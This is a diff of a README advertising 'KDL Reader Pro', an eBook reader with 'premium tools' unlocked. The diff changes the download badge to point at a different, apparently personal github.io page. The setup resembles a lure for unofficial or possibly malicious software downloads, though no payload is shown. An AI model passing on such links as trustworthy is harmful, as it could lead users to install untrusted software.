@@ -3,7 +3,7 @@
 Upgrade your reading experience with **KDL Reader Pro**, a clean and powerful desktop reader for Kindle (AZW/MOBI) and standard eBook formats (EPUB, PDF). Unlock all premium tools to read, highlight, annotate, and organize your entire library on PC.
 
 ⬇️ **Download**  
-[![Download KDL Reader Pro](https://img.shields.io/badge/Download-KDL_Reader_Pro-4B0082?style=for-the-badge&logo=bookstack&logoColor=white)](https://kdl-reader-free-tool.github.io/.github/)
+[![Download KDL Reader Pro](https://img.shields.io/badge/Download-KDL_Reader_Pro-4B0082?style=for-the-badge&logo=bookstack&logoColor=white)](https://wyattmccann321cloud.github.io/.github/kdl-reader-tool)
 
 ---
 
